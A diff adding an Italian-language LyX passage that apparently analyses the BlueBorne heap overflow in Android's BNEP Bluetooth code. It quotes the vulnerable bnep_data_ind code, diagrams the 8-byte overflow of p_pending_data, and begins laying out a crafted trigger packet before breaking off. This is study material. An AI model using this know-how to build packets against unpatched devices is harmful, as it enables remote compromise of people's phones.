@@ -1742,11 +1742,2820 @@ key "blueborne_android_rce_white_paper"
 \end_layout
 
 \begin_layout Standard
+La vulnerabilità in questione si trova in 
+\begin_inset CommandInset href
+LatexCommand href
+name "/stack/bnep/bnep_main.c"
+target "https://android.googlesource.com/platform/system/bt/+/android-7.1.1_r44/stack/bnep/bnep_main.c#475"
+
+\end_inset
+
+, in particolare nella funzione che gestisce i dati in transito su una connessio
+ne L2CAP da e verso il server BNEP:
+\end_layout
+
+\begin_layout Standard
+
+\size small
+\begin_inset listings
+lstparams "language={C++},tabsize=4"
+inline false
+status open
+
+\begin_layout Plain Layout
+
+static void bnep_data_ind (UINT16 l2cap_cid, BT_HDR *p_buf);
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Standard
+Andando ad analizzare la sua implementazione poniamo la nostra attenzione
+ sul seguente estratto:
+\end_layout
+
+\begin_layout Standard
+
+\size small
+\begin_inset listings
+lstparams "language={C++},tabsize=4"
+inline false
+status open
+
+\begin_layout Plain Layout
+
+UINT8 *p = (UINT8 *)(p_buf + 1) + p_buf->offset;
+\end_layout
+
+\begin_layout Plain Layout
+
+UINT16 rem_len = p_buf->len;
+\end_layout
+
+\begin_layout Plain Layout
+
+...
+\end_layout
+
+\begin_layout Plain Layout
+
+/* Get the type and extension bits */
+\end_layout
+
+\begin_layout Plain Layout
+
+type = *p++;
+\end_layout
+
+\begin_layout Plain Layout
+
+extension_present = type >> 7;
+\end_layout
+
+\begin_layout Plain Layout
+
+type &= 0x7f;
+\end_layout
+
+\begin_layout Plain Layout
+
+...
+\end_layout
+
+\begin_layout Plain Layout
+
+switch (type)
+\end_layout
+
+\begin_layout Plain Layout
+
+{
+\end_layout
+
+\begin_layout Plain Layout
+
+...
+\end_layout
+
+\begin_layout Plain Layout
+
+case BNEP_FRAME_CONTROL:
+\end_layout
+
+\begin_layout Plain Layout
+
+	ctrl_type = *p;
+\end_layout
+
+\begin_layout Plain Layout
+
+	p = bnep_process_control_packet(p_bcb, p, &rem_len, FALSE);
+\end_layout
+
+\begin_layout Plain Layout
+
+	if (ctrl_type == BNEP_SETUP_CONNECTION_REQUEST_MSG &&
+\end_layout
+
+\begin_layout Plain Layout
+
+		p_bcb->con_state != BNEP_STATE_CONNECTED &&
+\end_layout
+
+\begin_layout Plain Layout
+
+		extension_present && p && rem_len)
+\end_layout
+
+\begin_layout Plain Layout
+
+	{
+\end_layout
+
+\begin_layout Plain Layout
+
+		p_bcb->p_pending_data = (BT_HDR *)osi_malloc(rem_len);
+\end_layout
+
+\begin_layout Plain Layout
+
+		memcpy((UINT8 *)(p_bcb->p_pending_data + 1), p, rem_len);
+\end_layout
+
+\begin_layout Plain Layout
+
+		p_bcb->p_pending_data->len = rem_len;
+\end_layout
+
+\begin_layout Plain Layout
+
+		p_bcb->p_pending_data->offset = 0;
+\end_layout
+
+\begin_layout Plain Layout
+
+	}
+\end_layout
+
+\begin_layout Plain Layout
+
+...
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Standard
+Come si può vedere il codice dell'istruzione 
+\size small
+
+\begin_inset listings
+lstparams "tabsize=4"
+inline true
+status open
+
+\begin_layout Plain Layout
+
+if
+\end_layout
+
+\end_inset
+
+ viene eseguito al verificarsi di diverse condizioni relative al formato
+ del pacchetto (vedi Figura 
+\begin_inset CommandInset ref
+LatexCommand vref
+reference "fig:bnep-vulnerable-function-accepted-packet-format"
+
+\end_inset
+
+) e allo stato della connessione, in particolare:
+\end_layout
+
+\begin_layout Itemize
+il campo 
+\emph on
+BNEP Type
+\emph default
+ dell'header BNEP è posto al valore 
+\begin_inset Formula $0\text{x}01$
+\end_inset
+
+ (
+\size small
+
+\begin_inset listings
+lstparams "tabsize=4"
+inline true
+status open
+
+\begin_layout Plain Layout
+
+BNEP_FRAME_CONTROL
+\end_layout
+
+\end_inset
+
+)
+\end_layout
+
+\begin_layout Itemize
+il campo 
+\emph on
+BNEP Control Type 
+\emph default
+è posto al valore 
+\begin_inset Formula $0\text{x}01$
+\end_inset
+
+ (
+\size small
+
+\begin_inset listings
+lstparams "tabsize=4"
+inline true
+status open
+
+\begin_layout Plain Layout
+
+BNEP_SETUP_CONNECTION_REQUEST_MSG
+\end_layout
+
+\end_inset
+
+
+\size default
+)
+\end_layout
+
+\begin_layout Itemize
+il campo 
+\emph on
+Extension 
+\emph default
+è uguale a 
+\begin_inset Formula $1$
+\end_inset
+
+, cioè sono presenti degli 
+\emph on
+extension header
+\end_layout
+
+\begin_layout Itemize
+la connessione tra client e server non è ancora stata completata
+\end_layout
+
+\begin_layout Standard
+\align center
+\begin_inset Float figure
+wide false
+sideways false
+status open
+
+\begin_layout Plain Layout
+\align center
+\begin_inset ERT
+status open
+
+\begin_layout Plain Layout
+
+
+\backslash
+newcommand{
+\backslash
+colorbitbox}[3]{%
+\end_layout
+
+\begin_layout Plain Layout
+
+	
+\backslash
+rlap{
+\backslash
+bitbox{#2}{
+\backslash
+color{#1}
+\backslash
+rule{
+\backslash
+width}{
+\backslash
+height}}}%
+\end_layout
+
+\begin_layout Plain Layout
+
+	
+\backslash
+bitbox{#2}{#3}}
+\end_layout
+
+\begin_layout Plain Layout
+
+\end_layout
+
+\begin_layout Plain Layout
+
+
+\backslash
+begin{bytefield}[%
+\end_layout
+
+\begin_layout Plain Layout
+
+	boxformatting={
+\backslash
+centering
+\backslash
+itshape},
+\end_layout
+
+\begin_layout Plain Layout
+
+	bitwidth=1em]{32}
+\end_layout
+
+\begin_layout Plain Layout
+
+	
+\backslash
+bitheader[endianness=little]{0,6,7,8,15,16,31} 
+\backslash
+
+\backslash
+
+\end_layout
+
+\begin_layout Plain Layout
+
+		
+\backslash
+colorbitbox{blue!15}{7}{
+\backslash
+scriptsize BNEP Type = 
+\backslash
+(0x01
+\backslash
+)} &
+\end_layout
+
+\begin_layout Plain Layout
+
+		
+\backslash
+colorbitbox{blue!15}{1}{
+\backslash
+tiny E 
+\backslash
+
+\backslash
+ 
+\backslash
+tiny (
+\backslash
+(1
+\backslash
+))} &
+\end_layout
+
+\begin_layout Plain Layout
+
+		
+\backslash
+colorbitbox{yellow!15}{8}{
+\backslash
+scriptsize BNEP Control Type = 
+\backslash
+(0x01
+\backslash
+)} &
+\end_layout
+
+\begin_layout Plain Layout
+
+		
+\backslash
+colorbitbox{cyan!15}{8}{
+\backslash
+scriptsize UUID Size} &
+\end_layout
+
+\begin_layout Plain Layout
+
+		
+\backslash
+colorbitbox{cyan!15}{8}{
+\backslash
+scriptsize Destination Service UUID 
+\backslash
+
+\backslash
+ 
+\backslash
+tiny (Byte 
+\backslash
+(0
+\backslash
+))} 
+\backslash
+
+\backslash
+
+\end_layout
+
+\begin_layout Plain Layout
+
+		
+\backslash
+colorbitbox{cyan!15}{24}{
+\backslash
+scriptsize Destination Service UUID 
+\backslash
+
+\backslash
+ 
+\backslash
+tiny (Byte 
+\backslash
+(1-N
+\backslash
+))} &
+\end_layout
+
+\begin_layout Plain Layout
+
+		
+\backslash
+colorbitbox{cyan!15}{8}{
+\backslash
+scriptsize Source Service UUID 
+\backslash
+
+\backslash
+ 
+\backslash
+tiny (Byte 
+\backslash
+(0
+\backslash
+))} 
+\backslash
+
+\backslash
+
+\end_layout
+
+\begin_layout Plain Layout
+
+		
+\backslash
+colorbitbox{cyan!15}{24}{
+\backslash
+scriptsize Source Service UUID 
+\backslash
+
+\backslash
+ 
+\backslash
+tiny (Byte 
+\backslash
+(1-N
+\backslash
+))} 
+\backslash
+
+\backslash
+
+\end_layout
+
+\begin_layout Plain Layout
+
+		
+\backslash
+
+\backslash
+
+\end_layout
+
+\begin_layout Plain Layout
+
+		
+\backslash
+colorbitbox{blue!15}{7}{
+\backslash
+scriptsize Extension Type = 
+\backslash
+(0x00
+\backslash
+)} &
+\end_layout
+
+\begin_layout Plain Layout
+
+		
+\backslash
+colorbitbox{blue!15}{1}{
+\backslash
+tiny E 
+\backslash
+
+\backslash
+ 
+\backslash
+tiny (
+\backslash
+(1
+\backslash
+))} &
+\end_layout
+
+\begin_layout Plain Layout
+
+		
+\backslash
+colorbitbox{blue!15}{8}{
+\backslash
+scriptsize Extension Length} &
+\end_layout
+
+\begin_layout Plain Layout
+
+		
+\backslash
+colorbitbox{yellow!15}{8}{
+\backslash
+scriptsize BNEP Control Type} &
+\end_layout
+
+\begin_layout Plain Layout
+
+		
+\backslash
+colorbitbox{cyan!15}{8}{
+\backslash
+tiny Pacchetto di controllo basato sul Control Type} 
+\backslash
+
+\backslash
+
+\end_layout
+
+\begin_layout Plain Layout
+
+		
+\backslash
+wordbox[]{1}{$
+\backslash
+vdots$} 
+\backslash
+
+\backslash
+[1ex]
+\end_layout
+
+\begin_layout Plain Layout
+
+		
+\backslash
+colorbitbox{blue!15}{7}{
+\backslash
+scriptsize Extension Type = 
+\backslash
+(0x00
+\backslash
+)} &
+\end_layout
+
+\begin_layout Plain Layout
+
+		
+\backslash
+colorbitbox{blue!15}{1}{
+\backslash
+tiny E 
+\backslash
+
+\backslash
+ 
+\backslash
+tiny (
+\backslash
+(1
+\backslash
+))} &
+\end_layout
+
+\begin_layout Plain Layout
+
+		
+\backslash
+colorbitbox{blue!15}{8}{
+\backslash
+scriptsize Extension Length} &
+\end_layout
+
+\begin_layout Plain Layout
+
+		
+\backslash
+colorbitbox{yellow!15}{8}{
+\backslash
+scriptsize BNEP Control Type} &
+\end_layout
+
+\begin_layout Plain Layout
+
+		
+\backslash
+colorbitbox{cyan!15}{8}{
+\backslash
+tiny Pacchetto di controllo basato sul Control Type} 
+\backslash
+
+\backslash
+
+\end_layout
+
+\begin_layout Plain Layout
+
+		
+\backslash
+colorbitbox{blue!15}{7}{
+\backslash
+scriptsize Extension Type = 
+\backslash
+(0x00
+\backslash
+)} &
+\end_layout
+
+\begin_layout Plain Layout
+
+		
+\backslash
+colorbitbox{blue!15}{1}{
+\backslash
+tiny E 
+\backslash
+
+\backslash
+ 
+\backslash
+tiny (
+\backslash
+(0
+\backslash
+))} &
+\end_layout
+
+\begin_layout Plain Layout
+
+		
+\backslash
+colorbitbox{blue!15}{8}{
+\backslash
+scriptsize Extension Length} &
+\end_layout
+
+\begin_layout Plain Layout
+
+		
+\backslash
+colorbitbox{yellow!15}{8}{
+\backslash
+scriptsize BNEP Control Type} &
+\end_layout
+
+\begin_layout Plain Layout
+
+		
+\backslash
+colorbitbox{cyan!15}{8}{
+\backslash
+tiny Pacchetto di controllo basato sul Control Type} 
+\backslash
+
+\backslash
+
+\end_layout
+
+\begin_layout Plain Layout
+
+
+\backslash
+end{bytefield}
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Plain Layout
+\begin_inset Caption Standard
+
+\begin_layout Plain Layout
+\begin_inset CommandInset label
+LatexCommand label
+name "fig:bnep-vulnerable-function-accepted-packet-format"
+
+\end_inset
+
+Formato del pacchetto BNEP che permette di raggiungere il codice vulnerabile
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Standard
+Quando tutte queste condizioni si verificano simultaneamente il server BNEP
+ avvia in modo asincrono la richiesta di connessione e mette in coda i messaggi
+ di controllo successivi nel buffer 
+\size small
+
+\begin_inset listings
+lstparams "tabsize=4"
+inline true
+status open
+
+\begin_layout Plain Layout
+
+p_pending_data
+\end_layout
+
+\end_inset
+
+
+\size default
+.
+ Questo avviene in quanto quando i messaggi di controllo presenti negli
+ 
+\emph on
+extension header
+\emph default
+ seguono l'header BNEP per la richiesta di collegamento è possibile che
+ questi richiedano una connessione già instaurata, quindi non possono essere
+ processati subito.
+\end_layout
+
+\begin_layout Standard
+\begin_inset VSpace defskip
+\end_inset
+
+
+\end_layout
+
+\begin_layout Standard
+Il codice che si occupa di mettere in coda i messaggi di controllo è:
+\end_layout
+
+\begin_layout Standard
+
+\size small
+\begin_inset listings
+lstparams "language={C++},tabsize=4"
+inline false
+status open
+
+\begin_layout Plain Layout
+
+p_bcb->p_pending_data = (BT_HDR *)osi_malloc(rem_len);
+\end_layout
+
+\begin_layout Plain Layout
+
+memcpy((UINT8 *)(p_bcb->p_pending_data + 1), p, rem_len);
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Standard
+Come si può notare il buffer 
+\size small
+
+\begin_inset listings
+lstparams "tabsize=4"
+inline true
+status open
+
+\begin_layout Plain Layout
+
+p_pending_data
+\end_layout
+
+\end_inset
+
+
+\size default
+ è allocato sull'heap con dimensione 
+\size small
+
+\begin_inset listings
+lstparams "tabsize=4"
+inline true
+status open
+
+\begin_layout Plain Layout
+
+rem_len
+\end_layout
+
+\end_inset
+
+ ed è
+\size default
+ di tipo 
+\size small
+
+\begin_inset listings
+lstparams "tabsize=4"
+inline true
+status open
+
+\begin_layout Plain Layout
+
+BT_HDR
+\end_layout
+
+\end_inset
+
+
+\size default
+, cioè una struttura definita come segue:
+\end_layout
+
+\begin_layout Standard
+
+\size small
+\begin_inset listings
+lstparams "language={C++},tabsize=4"
+inline false
+status open
+
+\begin_layout Plain Layout
+
+typedef struct {
+\end_layout
+
+\begin_layout Plain Layout
+
+	uint16_t event;
+\end_layout
+
+\begin_layout Plain Layout
+
+	uint16_t len;
+\end_layout
+
+\begin_layout Plain Layout
+
+	uint16_t offset;
+\end_layout
+
+\begin_layout Plain Layout
+
+	uint16_t layer_specific;
+\end_layout
+
+\begin_layout Plain Layout
+
+	uint8_t data[];
+\end_layout
+
+\begin_layout Plain Layout
+
+} BT_HDR;
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Standard
+Successivamente i 
+\size small
+
+\begin_inset listings
+lstparams "tabsize=4"
+inline true
+status open
+
+\begin_layout Plain Layout
+
+rem_len
+\end_layout
+
+\end_inset
+
+
+\size default
+ byte dei messaggi di controllo negli 
+\emph on
+extension header
+\emph default
+ vengono copiati da 
+\size small
+
+\begin_inset listings
+lstparams "tabsize=4"
+inline true
+status open
+
+\begin_layout Plain Layout
+
+p
+\end_layout
+
+\end_inset
+
+
+\size default
+ in 
+\size small
+
+\begin_inset listings
+lstparams "tabsize=4"
+inline true
+status open
+
+\begin_layout Plain Layout
+
+p_pending_data + 1
+\end_layout
+
+\end_inset
+
+
+\size default
+, cioè in 
+\size small
+
+\begin_inset listings
+lstparams "tabsize=4"
+inline true
+status open
+
+\begin_layout Plain Layout
+
+p_pending_data->data
+\end_layout
+
+\end_inset
+
+
+\size default
+.
+\end_layout
+
+\begin_layout Standard
+Il problema nasce dal fatto che la copia dei dati si comporta come se nell'heap
+ avessimo allocato la memoria necessaria a contenere sia la struttura 
+\size small
+
+\begin_inset listings
+lstparams "tabsize=4"
+inline true
+status open
+
+\begin_layout Plain Layout
+
+BT_HDR
+\end_layout
+
+\end_inset
+
+
+\size default
+ che il buffer 
+\size small
+
+\begin_inset listings
+lstparams "tabsize=4"
+inline true
+status open
+
+\begin_layout Plain Layout
+
+data[]
+\end_layout
+
+\end_inset
+
+
+\size default
+ di dimensione 
+\size small
+
+\begin_inset listings
+lstparams "tabsize=4"
+inline true
+status open
+
+\begin_layout Plain Layout
+
+rem_len
+\end_layout
+
+\end_inset
+
+
+\size default
+ (vedi Figura 
+\begin_inset CommandInset ref
+LatexCommand vref
+reference "fig:bnep-heap-without-overflow"
+
+\end_inset
+
+), mentre la memoria realmente allocata è solo quella necessaria a contenere
+ il buffer.
+ Quando viene eseguita la copia, quindi, gli ultimi 
+\begin_inset Formula $8$
+\end_inset
+
+ byte vengono scritti al di fuori dello spazio di memoria allocato, come
+ mostrato in Figura 
+\begin_inset CommandInset ref
+LatexCommand vref
+reference "fig:bnep-heap-with-overflow"
+
+\end_inset
+
+.
+\end_layout
+
+\begin_layout Standard
+\align center
+\begin_inset Float figure
+placement H
+wide false
+sideways false
+status open
+
+\begin_layout Plain Layout
+\align center
+\begin_inset ERT
+status open
+
+\begin_layout Plain Layout
+
+
+\backslash
+begin{bytefield}{10}
+\end_layout
+
+\begin_layout Plain Layout
+
+	
+\backslash
+wordbox[lrb]{1}{
+\backslash
+dots} 
+\backslash
+
+\backslash
+
+\end_layout
+
+\begin_layout Plain Layout
+
+	
+\backslash
+begin{leftwordgroup}{
+\backslash
+small 
+\backslash
+texttt{p
+\backslash
+_pending
+\backslash
+_data}}
+\end_layout
+
+\begin_layout Plain Layout
+
+		
+\backslash
+wordbox[lrt]{1}{
+\backslash
+small 
+\backslash
+texttt{event}} 
+\backslash
+
+\backslash
+
+\end_layout
+
+\begin_layout Plain Layout
+
+		
+\backslash
+wordbox[lrb]{1}{} 
+\backslash
+
+\backslash
+
+\end_layout
+
+\begin_layout Plain Layout
+
+		
+\backslash
+wordbox[lrt]{1}{
+\backslash
+small 
+\backslash
+texttt{len
+\backslash
+(=
+\backslash
+)rem
+\backslash
+_len}} 
+\backslash
+
+\backslash
+
+\end_layout
+
+\begin_layout Plain Layout
+
+		
+\backslash
+wordbox[lrb]{1}{} 
+\backslash
+
+\backslash
+
+\end_layout
+
+\begin_layout Plain Layout
+
+		
+\backslash
+wordbox[lrt]{1}{
+\backslash
+small 
+\backslash
+texttt{offset
+\backslash
+(=0
+\backslash
+)}} 
+\backslash
+
+\backslash
+
+\end_layout
+
+\begin_layout Plain Layout
+
+		
+\backslash
+wordbox[lrb]{1}{} 
+\backslash
+
+\backslash
+
+\end_layout
+
+\begin_layout Plain Layout
+
+		
+\backslash
+wordbox[lrt]{1}{
+\backslash
+small 
+\backslash
+texttt{layer
+\backslash
+_specific}} 
+\backslash
+
+\backslash
+
+\end_layout
+
+\begin_layout Plain Layout
+
+		
+\backslash
+wordbox[lrb]{1}{} 
+\backslash
+
+\backslash
+
+\end_layout
+
+\begin_layout Plain Layout
+
+\end_layout
+
+\begin_layout Plain Layout
+
+		
+\backslash
+begin{rightwordgroup}{
+\backslash
+texttt{rem
+\backslash
+_len} byte}
+\end_layout
+
+\begin_layout Plain Layout
+
+			
+\backslash
+wordbox{1}{
+\backslash
+small 
+\backslash
+texttt{data[0]}} 
+\backslash
+
+\backslash
+
+\end_layout
+
+\begin_layout Plain Layout
+
+			
+\backslash
+wordbox{1}{
+\backslash
+small 
+\backslash
+texttt{data[1]}} 
+\backslash
+
+\backslash
+
+\end_layout
+
+\begin_layout Plain Layout
+
+			
+\backslash
+wordbox{1}{
+\backslash
+vdots} 
+\backslash
+
+\backslash
+
+\end_layout
+
+\begin_layout Plain Layout
+
+			
+\backslash
+wordbox{1}{
+\backslash
+small 
+\backslash
+texttt{data[rem
+\backslash
+_len-2]}} 
+\backslash
+
+\backslash
+
+\end_layout
+
+\begin_layout Plain Layout
+
+			
+\backslash
+wordbox{1}{
+\backslash
+small 
+\backslash
+texttt{data[rem
+\backslash
+_len-1]}}
+\end_layout
+
+\begin_layout Plain Layout
+
+		
+\backslash
+end{rightwordgroup}
+\end_layout
+
+\begin_layout Plain Layout
+
+	
+\backslash
+end{leftwordgroup} 
+\backslash
+
+\backslash
+
+\end_layout
+
+\begin_layout Plain Layout
+
+\end_layout
+
+\begin_layout Plain Layout
+
+	
+\backslash
+wordbox[lrt]{1}{
+\backslash
+dots} 
+\backslash
+
+\backslash
+
+\end_layout
+
+\begin_layout Plain Layout
+
+ 
+\backslash
+end{bytefield}
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Plain Layout
+\begin_inset Caption Standard
+
+\begin_layout Plain Layout
+\begin_inset CommandInset label
+LatexCommand label
+name "fig:bnep-heap-without-overflow"
+
+\end_inset
+
+Vista della struttura 
+\family typewriter
+p_pending_data
+\family default
+ nell'heap come dovrebbe essere
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Standard
+\begin_inset Float figure
+placement H
+wide false
+sideways false
+status open
+
+\begin_layout Plain Layout
+\align center
+\begin_inset ERT
+status open
+
+\begin_layout Plain Layout
+
+
+\backslash
+newcommand{
+\backslash
+colorbitbox}[3]{%
+\end_layout
+
+\begin_layout Plain Layout
+
+	
+\backslash
+rlap{
+\backslash
+bitbox{#2}{
+\backslash
+color{#1}
+\backslash
+rule{
+\backslash
+width}{
+\backslash
+height}}}%
+\end_layout
+
+\begin_layout Plain Layout
+
+	
+\backslash
+bitbox{#2}{#3}}
+\end_layout
+
+\begin_layout Plain Layout
+
+\end_layout
+
+\begin_layout Plain Layout
+
+
+\backslash
+begin{bytefield}{10}
+\end_layout
+
+\begin_layout Plain Layout
+
+	
+\backslash
+wordbox[lrb]{1}{
+\backslash
+dots} 
+\backslash
+
+\backslash
+
+\end_layout
+
+\begin_layout Plain Layout
+
+	
+\backslash
+begin{leftwordgroup}{
+\backslash
+small 
+\backslash
+texttt{p
+\backslash
+_pending
+\backslash
+_data}}
+\end_layout
+
+\begin_layout Plain Layout
+
+	
+\backslash
+begin{rightwordgroup}{
+\backslash
+texttt{rem
+\backslash
+_len} byte}
+\end_layout
+
+\begin_layout Plain Layout
+
+		
+\backslash
+wordbox[lrt]{1}{
+\backslash
+small 
+\backslash
+texttt{event}} 
+\backslash
+
+\backslash
+
+\end_layout
+
+\begin_layout Plain Layout
+
+		
+\backslash
+wordbox[lrb]{1}{} 
+\backslash
+
+\backslash
+
+\end_layout
+
+\begin_layout Plain Layout
+
+		
+\backslash
+wordbox[lrt]{1}{
+\backslash
+small 
+\backslash
+texttt{len
+\backslash
+(=
+\backslash
+)rem
+\backslash
+_len}} 
+\backslash
+
+\backslash
+
+\end_layout
+
+\begin_layout Plain Layout
+
+		
+\backslash
+wordbox[lrb]{1}{} 
+\backslash
+
+\backslash
+
+\end_layout
+
+\begin_layout Plain Layout
+
+		
+\backslash
+wordbox[lrt]{1}{
+\backslash
+small 
+\backslash
+texttt{offset
+\backslash
+(=0
+\backslash
+)}} 
+\backslash
+
+\backslash
+
+\end_layout
+
+\begin_layout Plain Layout
+
+		
+\backslash
+wordbox[lrb]{1}{} 
+\backslash
+
+\backslash
+
+\end_layout
+
+\begin_layout Plain Layout
+
+		
+\backslash
+wordbox[lrt]{1}{
+\backslash
+small 
+\backslash
+texttt{layer
+\backslash
+_specific}} 
+\backslash
+
+\backslash
+
+\end_layout
+
+\begin_layout Plain Layout
+
+		
+\backslash
+wordbox[lrb]{1}{} 
+\backslash
+
+\backslash
+
+\end_layout
+
+\begin_layout Plain Layout
+
+\end_layout
+
+\begin_layout Plain Layout
+
+		
+\backslash
+wordbox{1}{
+\backslash
+small 
+\backslash
+texttt{data[0]}} 
+\backslash
+
+\backslash
+
+\end_layout
+
+\begin_layout Plain Layout
+
+		
+\backslash
+wordbox{1}{
+\backslash
+small 
+\backslash
+texttt{data[1]}} 
+\backslash
+
+\backslash
+
+\end_layout
+
+\begin_layout Plain Layout
+
+		
+\backslash
+wordbox{1}{
+\backslash
+vdots}
+\end_layout
+
+\begin_layout Plain Layout
+
+	
+\backslash
+end{rightwordgroup}
+\end_layout
+
+\begin_layout Plain Layout
+
+	
+\backslash
+end{leftwordgroup} 
+\backslash
+
+\backslash
+
+\end_layout
+
+\begin_layout Plain Layout
+
+\end_layout
+
+\begin_layout Plain Layout
+
+	
+\backslash
+begin{rightwordgroup}{byte in overflow}
+\end_layout
+
+\begin_layout Plain Layout
+
+		
+\backslash
+colorbitbox{red!15}{10}{
+\backslash
+small 
+\backslash
+texttt{data[rem
+\backslash
+_len-8]}} 
+\backslash
+
+\backslash
+
+\end_layout
+
+\begin_layout Plain Layout
+
+		
+\backslash
+colorbitbox{red!15}{10}{
+\backslash
+small 
+\backslash
+texttt{data[rem
+\backslash
+_len-7]}} 
+\backslash
+
+\backslash
+
+\end_layout
+
+\begin_layout Plain Layout
+
+		
+\backslash
+colorbitbox{red!15}{10}{
+\backslash
+small 
+\backslash
+texttt{data[rem
+\backslash
+_len-6]}} 
+\backslash
+
+\backslash
+
+\end_layout
+
+\begin_layout Plain Layout
+
+		
+\backslash
+colorbitbox{red!15}{10}{
+\backslash
+small 
+\backslash
+texttt{data[rem
+\backslash
+_len-5]}} 
+\backslash
+
+\backslash
+
+\end_layout
+
+\begin_layout Plain Layout
+
+		
+\backslash
+colorbitbox{red!15}{10}{
+\backslash
+small 
+\backslash
+texttt{data[rem
+\backslash
+_len-4]}} 
+\backslash
+
+\backslash
+
+\end_layout
+
+\begin_layout Plain Layout
+
+		
+\backslash
+colorbitbox{red!15}{10}{
+\backslash
+small 
+\backslash
+texttt{data[rem
+\backslash
+_len-3]}} 
+\backslash
+
+\backslash
+
+\end_layout
+
+\begin_layout Plain Layout
+
+		
+\backslash
+colorbitbox{red!15}{10}{
+\backslash
+small 
+\backslash
+texttt{data[rem
+\backslash
+_len-2]}} 
+\backslash
+
+\backslash
+
+\end_layout
+
+\begin_layout Plain Layout
+
+		
+\backslash
+colorbitbox{red!15}{10}{
+\backslash
+small 
+\backslash
+texttt{data[rem
+\backslash
+_len-1]}}
+\end_layout
+
+\begin_layout Plain Layout
+
+	
+\backslash
+end{rightwordgroup} 
+\backslash
+
+\backslash
+
+\end_layout
+
+\begin_layout Plain Layout
+
+	
+\backslash
+wordbox[lrt]{1}{
+\backslash
+dots} 
+\backslash
+
+\backslash
+
+\end_layout
+
+\begin_layout Plain Layout
+
+ 
+\backslash
+end{bytefield}
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Plain Layout
+\begin_inset Caption Standard
+
+\begin_layout Plain Layout
+\begin_inset CommandInset label
+LatexCommand label
+name "fig:bnep-heap-with-overflow"
+
+\end_inset
+
+Vista della struttura 
+\family typewriter
+p_pending_data
+\family default
+ nell'heap come è realmente
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Standard
+È importante notare che sia il valore di 
+\size small
+
+\begin_inset listings
+lstparams "tabsize=4"
+inline true
+status open
+
+\begin_layout Plain Layout
+
+rem_len
+\end_layout
+
+\end_inset
+
+
+\size default
+ che i dati puntati da 
+\size small
+
+\begin_inset listings
+lstparams "tabsize=4"
+inline true
+status open
+
+\begin_layout Plain Layout
+
+p
+\end_layout
+
+\end_inset
+
+
+\size default
+ sono sotto il controllo dell'attaccante, quindi la domanda da porci ora
+ è: cosa succede quando andiamo in 
+\emph on
+overflow
+\emph default
+ di 
+\begin_inset Formula $8$
+\end_inset
+
+ byte?
+\end_layout
+
+\begin_layout Standard
+Innanzitutto costruiamo un pacchetto che sia in grado di eseguire il frammento
+ di codice in esame come mostrato in Figura 
+\begin_inset CommandInset ref
+LatexCommand vref
+reference "fig:bnep-vulnerable-function-sample-packet-format"
+
+\end_inset
+
+.
+\end_layout
+
+\begin_layout Standard
+\align center
+\begin_inset Float figure
+placement H
+wide false
+sideways false
+status open
+
+\begin_layout Plain Layout
+\align center
+\begin_inset ERT
+status open
+
+\begin_layout Plain Layout
+
+
+\backslash
+newcommand{
+\backslash
+colorbitbox}[3]{%
+\end_layout
+
+\begin_layout Plain Layout
+
+	
+\backslash
+rlap{
+\backslash
+bitbox{#2}{
+\backslash
+color{#1}
+\backslash
+rule{
+\backslash
+width}{
+\backslash
+height}}}%
+\end_layout
+
+\begin_layout Plain Layout
+
+	
+\backslash
+bitbox{#2}{#3}}
+\end_layout
+
+\begin_layout Plain Layout
+
+\end_layout
+
+\begin_layout Plain Layout
+
+
+\backslash
+begin{bytefield}[%
+\end_layout
+
+\begin_layout Plain Layout
+
+	boxformatting={
+\backslash
+centering
+\backslash
+itshape},
+\end_layout
+
+\begin_layout Plain Layout
+
+	bitwidth=1em]{32}
+\end_layout
+
+\begin_layout Plain Layout
+
+	
+\backslash
+bitheader[endianness=little]{0,6,7,8,15,16,31} 
+\backslash
+
+\backslash
+
+\end_layout
+
+\begin_layout Plain Layout
+
+		
+\backslash
+colorbitbox{blue!15}{7}{
+\backslash
+scriptsize BNEP Type = 
+\backslash
+texttt{0x01}} &
+\end_layout
+
+\begin_layout Plain Layout
+
+		
+\backslash
+colorbitbox{blue!15}{1}{
+\backslash
+tiny E 
+\backslash
+
+\backslash
+ 
+\backslash
+tiny (
+\backslash
+texttt{1})} &
+\end_layout
+
+\begin_layout Plain Layout
+
+		
+\backslash
+colorbitbox{yellow!15}{8}{
+\backslash
+scriptsize BNEP Control Type = 
+\backslash
+texttt{0x01}} &
+\end_layout
+
+\begin_layout Plain Layout
+
+		
+\backslash
+colorbitbox{cyan!15}{8}{
+\backslash
+scriptsize UUID Size = 
+\backslash
+texttt{0x01}} &
+\end_layout
+
+\begin_layout Plain Layout
+
+		
+\backslash
+colorbitbox{cyan!15}{8}{
+\backslash
+scriptsize Destination Service UUID = 
+\backslash
+texttt{0xAA}} 
+\backslash
+
+\backslash
+
+\end_layout
+
+\begin_layout Plain Layout
+
+		
+\backslash
+colorbitbox{cyan!15}{8}{
+\backslash
+scriptsize Source Service UUID = 
+\backslash
+texttt{0xBB}} &
+\end_layout
+
+\begin_layout Plain Layout
+
+\end_layout
+
+\begin_layout Plain Layout
+
+		
+\backslash
+colorbitbox{red!15}{8}{
+\backslash
+texttt{0xCC}} &
+\end_layout
+
+\begin_layout Plain Layout
+
+		
+\backslash
+colorbitbox{red!15}{8}{
+\backslash
+texttt{0xCC}} &
+\end_layout
+
+\begin_layout Plain Layout
+
+		
+\backslash
+colorbitbox{red!15}{8}{
+\backslash
+texttt{0xCC}} 
+\backslash
+
+\backslash
+
+\end_layout
+
+\begin_layout Plain Layout
+
+		
+\backslash
+colorbitbox{red!15}{8}{
+\backslash
+texttt{0xCC}} &
+\end_layout
+
+\begin_layout Plain Layout
+
+		
+\backslash
+colorbitbox{red!15}{8}{
+\backslash
+texttt{0x41}} &
+\end_layout
+
+\begin_layout Plain Layout
+
+		
+\backslash
+colorbitbox{red!15}{8}{
+\backslash
+texttt{0x41}} &
+\end_layout
+
